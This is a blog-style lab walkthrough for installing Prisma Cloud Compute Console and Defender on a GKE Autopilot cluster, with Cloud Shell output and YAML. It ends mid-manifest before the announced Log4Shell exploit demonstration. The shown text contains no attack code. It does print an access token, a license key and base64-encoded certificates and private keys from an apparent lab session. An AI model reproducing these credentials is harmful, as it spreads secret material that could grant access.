---
layout: single
title:  "Defending Autopilot GKE Runtime from Log4Shell Exploits with Prisma Cloud"
date:   2023-04-30 01:59:04 +0530
categories: Cloud
tags: GCP
classes: wide
show_date: true
header:
  overlay_image: /assets/images/gcp-banner-1.png
  og_image: /assets/images/gcp-banner-1.png
  teaser: /assets/images/gpcne.png
author:
  name     : "Cloud Network Engineer"
  avatar   : "/assets/images/gpcne.png"

sidebar:
  - title: "Topics"
    nav: my-sidebar

---

# Defending Autopilot GKE Runtime from Log4Shell Exploits with Prisma Cloud

## Overview

With the Google Kubernetes Engine (GKE) Autopilot mode of operation,  your cluster's underlying infrastructure can be managed for you  (including nodes and node pools) so that it produces an optimized  cluster with a hands-off experience.

With GKE Autopilot, you no longer have to monitor the health of your  nodes or calculate the amount of node compute capacity that your  workloads require. Instead, you can stay within GKE without having to  interact with Compute Engine, as the nodes are already fully managed and optimized, and are provisioned based on your Pod's resource requests.

The Prisma Cloud integration with GKE supports installs of the Prisma Cloud Compute DaemonSet Defender on GKE Autopilot clusters. It is easy  to deploy and delivers automatic detection and protection of cluster  instances across the full lifecycle with vulnerability management,  compliance enforcement, access control, web application and API  security, and also runtime defense.

### Protecting GKE Autopilot clusters with Prisma Cloud

Prisma Cloud Defenders enforce the policies you want for your  environment. To install our DaemonSet Defender for Autopilot, simply  generate a Kubernetes CRI Defender using the Prisma Cloud Console or the CLI tool (twistcli) and then install the Defender on your Autopilot  cluster.

In this lab, you will use Prisma Cloud Compute to secure runtime aspects of a Autopilot Google Kubernetes Engine (GKE) Cluster.

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-1.png)

- Deploy Prisma Cloud Compute Console at a regular GKE Cluster **k8-cluster**
- Deploy Prisma Cloud Defender at an Autopilot GKE Cluster **autopilot-cluster-1**
- Deploy a demo application **Online Boutique** and learned Vulnerability Management and Runtime protection.
- Go through a real world use case to simulate exploits to the  Log4Shell vulnerability and defend the demo application with Prisma  Cloud Compute.

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-2.png)



## Task 1. Create an Autopilot GKE Cluster

1. From the **Navigation Menu**, select **Kubernetes Engine** > **Clusters**.
2. Click **Create**.
3. Under **Autopilot mode**, click **Configure**.
4. In the **Networking** section, for **Network access** select **Private Cluster** and select the checkbox for **Access control plane using its external IP address** and specify the Control Plane IP range as `172.16.0.0/28`.
5. Verify the **trust-kubernetes** network and the **trust-kubernetes-subnet** subnetwork are selected.
6. Click **Create**.

```sh
gcloud container --project "qwiklabs-gcp-04-a1719f40dd37" clusters create-auto "autopilot-cluster-1" --region "us-central1" --release-channel "regular" --enable-private-nodes --master-ipv4-cidr "172.16.0.0/28" --network "projects/qwiklabs-gcp-04-a1719f40dd37/global/networks/trust-kubernetes" --subnetwork "projects/qwiklabs-gcp-04-a1719f40dd37/regions/us-central1/subnetworks/trust-kubernetes-subnet" --cluster-ipv4-cidr "/17" --services-ipv4-cidr "/22"
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-3.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-4.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-5.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-6.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-7.png)



```sh
Welcome to Cloud Shell! Type "help" to get started.
Your Cloud Platform project in this session is set to qwiklabs-gcp-04-a1719f40dd37.
Use “gcloud config set project [PROJECT_ID]” to change to a different project.
student_01_ae596d9b4ef2@cloudshell:~ (qwiklabs-gcp-04-a1719f40dd37)$ gcloud container clusters get-credentials k8-cluster --zone us-central1-a --project qwiklabs-gcp-04-a1719f40dd37
Fetching cluster endpoint and auth data.
kubeconfig entry generated for k8-cluster.
student_01_ae596d9b4ef2@cloudshell:~ (qwiklabs-gcp-04-a1719f40dd37)$
```



## Task 2. Install Prisma Cloud Compute Console

1. From your Cloud Shell terminal, run the following command to download and install the latest Prisma Cloud Compute Console software image:

```sh
student_01_ae596d9b4ef2@cloudshell:~ (qwiklabs-gcp-04-a1719f40dd37)$ curl -O https://storage.googleapis.com/qwiklabs-code/prisma_cloud_compute_edition_21_08_525.tar.gz
mkdir prisma_cloud_compute_edition
tar xvzf prisma_cloud_compute_edition_21_08_525.tar.gz -C prisma_cloud_compute_edition/
cd prisma_cloud_compute_edition
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  463M  100  463M    0     0  22.1M      0  0:00:20  0:00:20 --:--:-- 23.2M
eula_red_hat_universal_base_image.pdf
linux/
linux/twistcli
openapi.json
osx/
osx/twistcli
prisma-cloud-jenkins-plugin.hpi
prisma-oss-licenses.txt
twistlock-license.pdf
twistlock.cfg
twistlock.sh
twistlock_console.tar.gz
version.txt
windows/
windows/twistcli.exe
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
```



2. Retrieve the Prisma Cloud Token.

   ```sh
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ gsutil cat gs://pcc01/token.txt
   wgdhemeo0dlxlflyhtmeob8uo4t1ffkystudent_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
   ```

   

3. Execute the following Linux `twistcli` command to generate the YAML file for the Prisma Cloud Compute console:

```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ ./linux/twistcli console export kubernetes --service-type LoadBalancer
Enter access token (required for pulling the Console image):
Neither storage class nor persistent volume labels were provided, using cluster default behavior
Saving output file to /home/student_01_ae596d9b4ef2/prisma_cloud_compute_edition/twistlock_console.yaml
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
```

The script is adding the token to the `yaml` file for initial authentication.



4. Now use `kubectl` to create the console:

   ```sh
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ kubectl create -f twistlock_console.yaml
   namespace/twistlock created
   configmap/twistlock-console created
   service/twistlock-console created
   serviceaccount/twistlock-console created
   persistentvolumeclaim/twistlock-console created
   deployment.apps/twistlock-console created
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
   ```

   Run the following command to check if the service has come up fully.  This service takes about 1 minute to fully provision so run the command  as many times as necessary to refresh the output.

   ```sh
   student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ kubectl get service -w -n twistlock
   NAME                TYPE           CLUSTER-IP    EXTERNAL-IP   PORT(S)                         AGE
   twistlock-console   LoadBalancer   10.32.13.64   <pending>     8084:32261/TCP,8083:32276/TCP   37s
   twistlock-console   LoadBalancer   10.32.13.64   34.135.233.230   8084:32261/TCP,8083:32276/TCP   42s
   ^Cstudent_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
   ```

   

The **External IP** will show once the service is available. **Make note of** the public IP under the `EXTERNAL-IP` heading.  This will be used to gain access to the Prisma Cloud Compute Console.

1. Once you see the `EXTERNAL-IP` use **CTRL-C** to stop the wait flag and return to the command line.

Configure the Prisma Cloud Console by opening a browser window, and browsing to `https://[YOUR-EXTERNAL-IP]:8083`.

By default, the Console uses HTTPS on port 8083. If you get a connection is not private warning, click **Advanced** > **Proceed**.



```sh
student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$ gsutil cat gs://pcc01/key.txt
sdZ3N/H2F5/i2KDQiCydSYGw+2tiGM/exZjrjVQR1lhjhJ9KO04kS+A57TJaXqmilpKljS6VSNkoGD4Y6uDvbHPvQdZIhCTJfvXNevURollttyKgfMot4wilToWbSAdSrpyr7nuOsAyRZTomrEvbhdPah8zeXGEdUprCzR9TSkLD9OXapXIgixNxfhMyO1NtlHemXFzhgyYEXg1VLjP4il7kHTnfI8mkPelLQGxNppG6/YzFm6toGXiUBNeUrMRCyFM/9eIJlnNMCwCzMbaJvcSLVGWApkxbC5q/AvRh6qwvUM8wnGUrTWem99WBrWhCpK1Hmc3EfD/S8G57AhCBAQPxr00Wph6RxiSQAHOEGo0D0LDSK/BlJCIMVCYp/C5XGCQOV3ze7Y7jotPGx/kthhW+iwhMiDdOhgcaAJq+b6krx1KWR4R1PHU9kEGrUfestnRPBxzI7QpW+Bw1psSyzd7ywmQkmUqfNfqyQS7ZxHcp7w4/7bvj3KNdEET8La67Jzgj0tkLZONpcNJ7PuNOQbKVeleZlipQtrhcogSIcow81ZRFYv77weQ8cOZqXPPFH7tkjVthwjS4rBLcmyYXvxD/BTWcvrWaZcs4wKYui1jP+TYdduQGOdCeAE0Tqu5jZVDizadm8icBTCFAYw07V3dAI0I8Ty6CWZVvk6FXJds=student_01_ae596d9b4ef2@cloudshell:~/prisma_cloud_compute_edition (qwiklabs-gcp-04-a1719f40dd37)$
```

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-8.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-9.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-10.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-11.png)

![]({{ site.url }}{{ site.baseurl }}/assets/images/gcp-prisma-12.png)

### Download defender installation YAML

Now you will install the Prisma Cloud Compute Defender Daemonset.   The Defender is a software module that will be installed to monitor  every Container. Defender communicates with the Prisma Cloud Compute  Console using Transport Layer Security (TLS). You will update the list  of identifiers in Console's certificate that the Defenders will use to  validate the Console's identity. This will change your current browser  certificate and force you to log back in to the Prisma Cloud Compute  Console.

Add the Console IP address to Subject Alternative Name (SAN) list. From the Prisma Cloud Compute Console, go to **Manage** > **Defenders**, then click the **Names** tab.



From step 3 the client defender name should be the public IP address.  The defender is installed as a DaemonSet, which ensures that an instance of defender runs on every node in the cluster.



```yaml

apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: twistlock-view
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"] # Allow Defenders to list RBAC resources
  verbs: ["list"]
---

apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: twistlock-view-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: twistlock-view
subjects:
- apiGroup:
  kind: ServiceAccount
  name: twistlock-service
  namespace: twistlock
---

---
apiVersion: v1
kind: Secret
metadata:
  name: twistlock-secrets
  namespace: twistlock
type: Opaque
data:
  service-parameter: TFlEVFRPZUJVLzlJTEIvNEV1bHBZVk1kQktYRS9mWFg5bXY1UHZVc3N1YnhjZEZpZ2l2c0tsRGdwMS9BNXdqMXRrUFRib095aUsrSE1PNzdXV2o4S0E9PQ==
  ca.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURIRENDQWdTZ0F3SUJBZ0lRRG1lMEg2TkFqekdNOVNxbXBGbkM3akFOQmdrcWhraUc5dzBCQVFzRkFEQW8KTVJJd0VBWURWUVFLRXdsVWQybHpkR3h2WTJzeEVqQVFCZ05WQkFNVENWUjNhWE4wYkc5amF6QWVGdzB5TXpBMApNekF4TmpNNU1EQmFGdzB5TmpBME1qa3hOak01TURCYU1DZ3hFakFRQmdOVkJBb1RDVlIzYVhOMGJHOWphekVTCk1CQUdBMVVFQXhNSlZIZHBjM1JzYjJOck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0MKQVFFQXNNVWxEQ3BaYktPcXZ1OVBBTC8zd01OZ3FhenhSM3BCTW0rS05tdE4vZG1Wc3VwOXJWS1R3VytHYmRpagpRMGdJNUtnZ1B0d0h2clg5eUJyZ3lUTHF2dkhQbGRFSG5sRmRyM1ZaVHdzR3c4czRiRkh3YmxrVndoYzZ5SWJ5CitDdTFxaXBjTHplQjZQL2wzY25EdFlJTCtBbTBRdW9wS2lHcklQR3hnZXZMVzlNamNHa1YydkpqRkk1bXJPOHUKeWhDSlZqcDRxRkFSd2Vwa0lXSmRWY2V2ZWNmcGZYWHFaQktmMWF5cHlyNHNUMUxLb04yc3pRSlo4QmdlMmM3cQpwb0VLT1p2Y3lJbVlZbDhXYzJ4aWg3YVpVWnFVY3U5cnJGb2doRExyTHNldUcrYllKcXIzS25MdHVDcEhreXRCCkxkRDVDR000ZnlhWStPdmRTVVlDdWpJMDJRSURBUUFCbzBJd1FEQU9CZ05WSFE4QkFmOEVCQU1DQXF3d0R3WUQKVlIwVEFRSC9CQVV3QXdFQi96QWRCZ05WSFE0RUZnUVVoTnJXY1NjUHRoSnUvMHhCL0hieTVRR3U1Njh3RFFZSgpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFHNnY3d3ozeDB1elFuM3ZnbGJJbFNmMkhwdXhGbVRWaFJYYU1yYStvSXI1Cml0SXdqT05Ob0NPUXl6ek1NRkJpNjNQWnBGdFdUSGYzaHV1OXVYUHRxN3ZoUzVLNUZlaStYTnViZWo5SjluSkYKRGwwVkVEbWh3b2hxMFhWTGl6Y2oyaTRxNjFhanhLL1c0SXRoYzlqQ3BZbDNFbCtPUDlGYTVBUWpkeVFuelc0Ngp6cTEyQlJPS08xVlZOMExBL2xTZ3J3S1JnbTdIQWV1NTNwV1BtZkFPam1Lb1hNOGZXcVJZeG11Y0hDYnRsWi93Cklsb2FrdFVyWU1Fb3NYSTJ2SUxISjlJa1k1VnF4Z0hWVFZPNExQQ1dBUWZiOFVIZmtFQy92Q0FVQkVMVTFrVFoKdno5bi9ZRzFjL0NUQ2dLREZoY2RmUEErVlV0b3BCdW9qV0NPOFB4cmZHTT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=
  client-cert.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURPekNDQWlPZ0F3SUJBZ0lRVVFzcUlQRGZyM0t5WWV1YWViQldEakFOQmdrcWhraUc5dzBCQVFzRkFEQW8KTVJJd0VBWURWUVFLRXdsVWQybHpkR3h2WTJzeEVqQVFCZ05WQkFNVENWUjNhWE4wYkc5amF6QWVGdzB5TXpBMApNekF4TmpNNU1EQmFGdzB5TmpBME1qa3hOak01TURCYU1DZ3hFakFRQmdOVkJBb1RDVlIzYVhOMGJHOWphekVTCk1CQUdBMVVFQXhNSmJHOWpZV3hvYjNOME1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0MKQVFFQTRpOERldHJpcUcvdHc2enA5MGh0NzYwU2VjdFgvdm5vM0pXc0U3UTdJTnFjUDNDVXRtKzd2dEtCbkdsSwpkdDNRYjBRUzZRaUVPRG5GNFp2anhteWhiQTRsQjh1T1F5cldvdVVSelBIZ29VdGM2SHZxWHJCd1hnd1l0NnR0CnhWTTZNWVcwb1Q4a1BHV0ZxbkdoTmJpN3hmSkdvQ3I5SS9LZTJZSmJ2UDBUdnRPSGE4dDRaN1RtZFVhcmtkNnMKVS9YS3dqSXVkakxqTVBwUHRjWHJjNUJUN29hMzRvcEZlcU1odjk3Q0xCVElWSEQxNC9wVWJCaHZrSld0ZjB1Lwo0VWRBZGZmV2toM3BvZTBOZGl2YUZ0Ty9EemNTblNSS0ttTmdwclVqODNvTGJ4QWpaUFpwVHc1K2R1M3FFckhHCkVQeDduZlBnVnZHOUduNUtvdVREY3pUTlZRSURBUUFCbzJFd1h6QU9CZ05WSFE4QkFmOEVCQU1DQjRBd0V3WUQKVlIwbEJBd3dDZ1lJS3dZQkJRVUhBd0l3REFZRFZSMFRBUUgvQkFJd0FEQWZCZ05WSFNNRUdEQVdnQlNFMnRaeApKdysyRW03L1RFSDhkdkxsQWE3bnJ6QUpCZ1VxQkFFQ0J3UUFNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUJBUUNPCnFiSkQ4N0JIQWppbTJUeWhtR1FrZTJ2eDc4SmJKb1cveEF0aU0yOEFBOUdjZjJpSDJIQTh6cDNTTVMzRDFUTXYKRkIxQjlzeEZhRmVjZlZKYnBiaStXR1hpVFF0VXByUWxlOE1MeGxud2N6YVJnMVNSTXR0Q0JhZDA0OVY2MTY3egpJc3pUMXVUVkhNUE1BTTY2RXV1QzdMTDFOb2hIRCtEdmc1bTMxSWlVQ2l1NU82czJ1NlJ1UFB4UlRXM1d5MENoCkpMWmZXUkxGT2Z5empvZ0tUT0FMcVovWCswZ0tkRW1JQU5zRFcrWFM5ek55QVFQU09yTDdYUTJzaytTWDUxQnQKUlV6WmhWdlJQbHcwTnlFMkRPYVNid0ZnUk1xWUJ0M2dsZHVOUDVXL0swclVNZlNGNzhsc2EvN2pJVjgvbmtESAprd0N0V0FqdzZSNGI3NkNGcHhrbgotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
  client-key.pem: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBBRVMtMjU2LUNCQyw1Mzc2Y2Y0ODdkOGI1YzBhNmU1MTQ1NGY2MWYxOTZjMAoKVUFPaks1NTd2RHArT212RTF2d1htTnRJaFRiOXBFWlVvZ0ZhZGphS2dhVlduaVNKY3BaZG53NktHS2RoSThoSgpINFA2N1RKNlpkblpoS0pXbWtZRjFRNUlkUU4wdVA1WnlwSXU3TVFvS1IzZXdrRkhOQ205MnlNVnJhbU9ndVZHClAwL2I4SVlnbi9VL2NuZnhjdSs5QUxpNnRLM1dTajduOSt4QzlPZG5Na25sekRnem5aZE5yKzBVdzlQdVpVamkKVFBrM0lpbnNUN1lFUDZ0OEZQR0ZhK3hpdElrOXdNZm9rcVBDRm5lRGtUdndEYUx4RGp3NkJ5REpoMmhzNnlmUgpKNEY3MHNPUERCZzJtdkZBSy9JYVB2QnQ5cXVEMWVYN2U2VmtqOXBIeFNZV2oweHBqeWdlQjlXc0Fhb2gyY0ZBCkVDYVRhdmk4T3dGaytMeFo0QU5EbHFpbU9EVGp4dTNIb3kyRG1UQUlNZnZFcFF1c0pSMmgxQ0NUME5CQXg3ODcKbmwrSUF0Q3lVWndEZjBQbHI5b0gydm42alJHTTFCRWx1WFR6cjI0Z2g5ZDZISFhLTE5TY0FSeldNMHFoemUvMwpKU1NGb2VJQXA2YWd0ajdXaUU2bGF4MEk5Y3djY3RmditEcWV4OEZDMXpBQk5Wc0FxWHFpa21ieXNjbVRHRGtiCm5UMVdhS2RBcExPekxXN1pSWVdTVVhkd3Y1bGRyaCtGb01IQnpFbjgzZE9uQUQ3b3h1YlJkVEtzSDEzUjV5dGMKWDZMdW53dUhKMys0bHMwNzlieU15TlhJMnFnUGIzU05HZnk1OXFJUnJHQlhIUDduZ29pUndWMkRNUTlDUldZMgorQm1pNjFYSkw0bjlraEhHQ2xJOWhadjkwTlhLZWxscWpuWGV1MWMzVS9nLzJuZUVCTzU2dlZGazVyNW9SUXlOCmdELzlDMGJwdWw0eXBjLzhrNS9SeTUzSTlaVDVQZDNTMXY4V3FoUlphRmFrN0RncHNGaGUvQWZ1WjlUa3lIWUgKeDdEbmJ0NFFjOTl1WVNIQ0V2TjY5YVMvK2NpSDM4QjNXWnVEZ1hKNW1ZWCs0aVIxaGFSVW1TZDR4b0gwY0JXeApVY2ZmK3VJblRHeTZwWWVyMXV1VldYaWI4eDgyWXVIYnRlTkhJcWZyQ29Bc2JLSU81MGxodk80YW55OVhrd1dIClg4NERWS21mbjFZV01GMDZMUGVTcUdjSWVaMVNSSDNPNkNHMDhFS3pQdjlyODF3VkZXTXRZb3BPc3pETjhYTkMKazFZNlhIc2NDUGE3TVpiY1FENHZqRGwvT0JRd2dRbVArNXBXQ01xMXFvODl1Q3BScEJSRnIrZ0FEWitoeS8xbwpvZ0dGMnlNT2cwbEpJL3ZidWt3VHZmUHo2NC8xbTdaOXVQN0k1aDNQRkN4SU45RDBnQzhXMExRejQwbUVrRlRJCjJRcTdDUTMwUHZNUU0yVHNuenlrOUhHWG9aNHZINzB6Q2tiVktwa0VuaEkydWpsR0taOVN3MUpmak9xWWREbGsKK3BHbzZqM0NkTktlOGUzZ1NwT3JoK0RRUGZPUTRYOHBPTG1LaWFXN0t6ZGtTa3M5Q2RQZlhEQzl6ZTRaTDNHUApUMWgxTU56MVFyMjE5eWx2WXdpWW9ld1h5R2tBK1F1MXhiUlRTM0IrUldFRm56VGl1eThvYkY0anA3Mm5QVkw4CjM5UmcyV0JkRGNQV0R1MHFyeW9qT0VVNlp6RnRsdDc5NkQ3Tm1vUG5mNVhlTTZLMnFJbjdPSCtyRGRVWWVla3IKanBIUlZnMDMzbURJc1ZFUldFNUt1SnBTTUJXUEVlRUJBY0lqUnZpS0dYN2dGSkk4WTlMWUJGWThucXkzNnRUago4U2dmdUFsN21INUFDdTNhcG5rc1ZXaEJLZ0lMTWJwY3NCcjhiRVlxbnBpbm53Z1NYNnJPSnV6NDRrV05JYmlqCnZQSnIxQUtKRXZ6Q1ppVXJWM0IvRlJUbm0xdDlaRjlBb3NsanVpdjB0OW9kR3VyY0Q4aEEybU1peWFGR0VwZncKOTZtckFTSWZDZ2dUci9zQ1ZlVk45d1A5NGg0WjBIeWFGY292eTREUnZXcEM1Z0NwdVNhVGdBelMyQ29acU12eAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
  admission-cert.pem: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURURENDQWpTZ0F3SUJBZ0lSQUxlU2MxLzQxRWsxVmtJcUhveGY3SXN3RFFZSktvWklodmNOQVFFTEJRQXcKS0RFU01CQUdBMVVFQ2hNSlZIZHBjM1JzYjJOck1SSXdFQVlEVlFRREV3bFVkMmx6ZEd4dlkyc3dIaGNOTWpNdwpORE13TVRZME56QXdXaGNOTWpZd05ESTVNVFkwTnpBd1dqQVVNUkl3RUFZRFZRUUtFd2xVZDJsemRHeHZZMnN3CmdnRWlNQTBHQ1NxR1NJYjNEUUVCQVFVQUE0SUJEd0F3Z2dFS0FvSUJBUURHWllYWXJLUnpIeTdrNHdRQjdrcysKTUpzNUhiTkFpcUo2c2xJOThxbC9qcjNrdCthS2JPVlEyUTAxeDMzRFVRbFdnSGRmR1dkZkVOVVhVNWpMenF5ZgpnN2MwWGd1cVBTYURxSnNhU0JiYW1iYjNZWXZmTzZjSzI2N1JlVnBwNi9VNFptNENHT1YvMkFzTnJvSTk1NzlECkhUV0Zhc3dLdGROQ2lsK3FNa3M4dDdtTnAwbk9nL1ZMNmMvaHBKS1ZBaFM3TlB5MDY1UzFVSHlaU1I1ZXNGbXcKQTQrYk9ZN1dkR1FBS3NibXRnNmN3Q0h1NzZ3V241TnRNTExkQ3M2eTl4Vjdsa1BXUUVRczAvRWFEOXhSQmJwMgp0K2dXa3lvWXNWMmRQQVEwam0yRmJsVUNaYXdrcUpvY1Y3Z2NWdzFFTVVzZ1dBVWd1dEhqRCtqVjlia2w2NzNsCkFnTUJBQUdqZ1lRd2dZRXdEZ1lEVlIwUEFRSC9CQVFEQWdPb01CMEdBMVVkSlFRV01CUUdDQ3NHQVFVRkJ3TUMKQmdnckJnRUZCUWNEQVRBTUJnTlZIUk1CQWY4RUFqQUFNQjhHQTFVZEl3UVlNQmFBRklUYTFuRW5EN1lTYnY5TQpRZngyOHVVQnJ1ZXZNQ0VHQTFVZEVRUWFNQmlDRm1SbFptVnVaR1Z5TG5SM2FYTjBiRzlqYXk1emRtTXdEUVlKCktvWklodmNOQVFFTEJRQURnZ0VCQUNlMzJKR0xYWmVSRnNCVXlrMllPQzg5WHJkeW9GVkpWd3pmeFY2QWdoNkQKeE9PUzFwSFhSQkJDNzZmaXlSa2RtVUtZTXQxZElxY09yQ3NiTjNWSzh3U2d5WmdGNit2U3ZqMGFaL0JhbWYzeApnZGRsWlRQQkE1KzNQQmFTOG03d0QrWWQ4YXYyTkVNOGxZUm4yY0ZmYjRMaFU3TS84ZC9vUnNFM3N5SXVVSWhkClBEVzRUL051TFlCeXlDTnpnSXlDbWVNS1hPOHB5U3hUeUNvb3RlV3MwVkdYbXRWWXp2OGdiNS9SL2hpckhqNDQKR2t6YUZwNlNCd1M1dGdMTUM3clUwQks5alVwRnJHSUJBSFRDajVRYXMxbW4yeW5kZUpsaTBwM3Z6ZW1rR2lpYQp5MHN6S0h6SUdrVHRvb3BlcmNPazJZS2J3SU9LRTNoM2RyU0c0TUphd2RzPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==
  admission-key.pem: LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBBRVMtMjU2LUNCQywwNDc1Y2U3MzliOTRiZTgzZDliZDUzNjZmZGUwN2E2ZgoKb0xtUjR6NnFtYXlpdnlxVGhvTGxhOWdaS2RodUhkVTJ3T3hYaFpkT2xnUzdvQnRhUzNPNVVrOGNHa0lGOTNZVAp2RFdyRGVRcDE1bkNHSmcwNTlKRVg1VUEyK3N5YTJha2JhOGVRVDJxVGpweFYrUll6K2JwYXVZQlRaMzU4clp1CkJlNEhGQ1JFNzNRVVN2ZGdlKzFMTnlBTTRScDlyWkhzbUtKT0dSYkxDcHFXbXNxcldtQkpMTEhSTFkvM1hGY0UKSUwwVHAwbHlPd1M0Nk5JcnUxSXY3cWxsQ0lIOEZKMWRMUGVvRHR5T3JPdXdSc1ZTcWRWbzZDUTdMWEtHL3VVUAorN2FENU1NR3RWajNwZ1FCYWthQzBGT0k2T0g2QWsvYlB5NmdnSnJVTkNvWlhpNDAvYWF3VHVUU0tBRzFtS1F1CjV4dVVYVGNWRCtXaU9US0N3S0E1TVBwUXlCZzJNL3NxdTd5OWc2azF4Y0x5WnF3MXQ1RFlNSi8vUHhaUUJERFkKVVZ5TCtYbmQ4R21wYzBYVHhQYm1jRnRFWjVhWGNqd2hYK3oyb3RwTXczS2Q4SU5OdHRFcGJwbmh2QjF5V255SApXRTl6RzdmVDVRODlXcS9SMUJDTXA0NmZpME1GQUN3SDNyaG9HZlBKNmYyeDcwdEFFM0w4UVVtYkZ4TGRYb2w0CmhuZHU3TFhZa2JIZHBTaTF3ZGZXNUFhZUV0akxWemRZamJQNDBpTkxhMTN0VW9VVHhFTUJHRURhRFJsYXAzZWoKakt4REs0bXRYUDV1R0g4QVVTOWV6Wk1yQzRxWDBERG5GaDVOdnhveTl1MFZaYkpJaGxOUEU5NHY3VW9uR0FseQpJYm9zRW9EODNxMllEUzV4MkNPSkk4dEt4eUFqa2NKSE5mM3VMbUpNbmRSZWNFNXNMQVZsSXdyOWlMbnRMbFBSCkdXcjhUQytqQUdoRVBaMmEyallOTjNDMjBRQUNHRzVkSmlGQ0RKcFZMKzYxajJqYWlINlZaUnlVangwazE4U1oKa2N3bW5oUGdmQm05V3VySkhaS1BjTTNwMlIwQlpEWGRQRk8rMUNVMmlybnkzVmVWQ2ZaVklHRE5QTnpJYW50SgpWNWdBL2cxZy9FZDZabDNuMlpMZFhNOFJhMlJCNCs2NVk0cnFKZWxKZnI4ZnBlb3lrcDJSYStvcFAzMU9ZM2QzCmZUTmJoaHA1UXVtSDBab0VGRUlPK1VlZlpZZEVGU2h3dHd3MjMrOEMvM0VsQm5GMzZYNHFQMHptcEl4Yjl2Zy8KWVpKanFvc0dETTNkMXBXRGFnMkVaelJLa1krSVZDRm9uT1E2MGptTTJzeWZiZE5iNTMrOE55UWtqR1FBK3NVWApsV0NPYjhPd3hvdnBjZno0NjdWUDVOdGpDY2dQVzE1WlVPcWdmTlRlcHE3SGFWV2g5QUZEOTk4YlpLMkErZStLClY2bTlrSUVUN1BHU0QzdHhUSlB3eHZURFltRTZkS0ZyYXhuNm9OQ2ZmMHFTK1RPOTk1RVo3Qi93TjczVHA2L0wKVUZGWEVxOW4yNFd5c3B3LzVyc3pHVkxUUWYvSjJGOGFwdTdDaFN0NitGUnFmSlRXbzJZWVZNQlR0Y0hQR1NnSQp0SlBBSGsySTV0NzN1RjhhWWJPRTdHc3FTTnpuN1B3ektsKzd0YmdBV1N2a1BzSFptY3J5eHNtajA4TU5jbGxRCi9HNmN5MXhxeEEvREFKeWhTUG9UMEM3aXFkNnpBOStwSmhWV2Nmd05TeGVWK3JLZ21lZGdlcm1HbUpmU2xCTXEKSHFiRm9saEVVbi8zU3NDdFl5akNEOHA2SFpBQTV4VWozSy9CZVJSNXJSRU1SVkxmREk4a3F4UkZYTlRwSHdWVApiNHRaV3VhSW1jeTFTc1V2Y3pEdVNhenNKSldqMXZZRUY2eUxoclpmak9yVGEraTNTWk9hWDF2ait4NXRSeGx4ClhaemlYczdiT1VES3ZSRDg2bkc0V1A0M3JJWkJ5cjBBd24rTlhUeGZWdGxWdG4xMVRKVVFxSGpQdDdMOEVJbzkKV21JbG9hRlAxUlRqQ1lkN2lIdDVKZ3JvR21OS2FzNkRWR0F3d3ExcmxDdmtTNnluMURockdDRFlkVFloTDc5ZAotLS0tLUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=

---
apiVersion: v1
kind: ServiceAccount # Service Account is used for managing security context constraints policies in Openshift (SCC)
metadata:
  name: twistlock-service
  namespace: twistlock
secrets:
- name: twistlock-secrets
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: twistlock-defender-ds
  namespace: twistlock
spec:
  selector:
